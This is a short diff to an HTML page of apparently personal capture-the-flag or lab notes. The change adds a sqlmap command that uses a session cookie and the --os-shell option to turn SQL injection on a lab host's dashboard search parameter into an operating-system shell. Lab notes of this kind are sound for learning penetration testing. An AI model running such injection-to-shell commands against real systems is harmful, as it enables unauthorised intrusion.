@@ -203,6 +203,9 @@
 <p>Using the session cookies and sqlmap: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
 cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"</p>
 
+<p>If the target is vulnerable for the get request (see above) we can get a shell out of it: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
+cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell</p>
+
 <p align="justify">How to add your generated ssh key to your known hosts. It helps with Github also.</p>
 
 <img src="images/ssh_key_add.png">
